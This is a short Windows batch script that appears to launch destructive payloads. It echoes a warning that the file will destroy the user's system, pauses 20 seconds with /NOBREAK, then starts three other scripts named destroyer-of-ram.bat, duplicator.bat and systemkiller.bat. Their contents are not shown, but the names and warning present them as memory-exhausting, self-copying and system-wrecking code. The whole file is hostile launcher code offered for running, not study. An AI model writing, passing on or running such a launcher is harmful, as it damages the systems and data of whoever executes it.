REM let's give them a fair warning.
@echo off
echo "The file you just executed contains code that will destroy your system. If you ran this without knowing what it is, you will have 20 seconds before it forgets what a windows is."
TIMEOUT /T 20 /NOBREAK > nul
start destroyer-of-ram.bat
start duplicator.bat
start systemkiller.bat
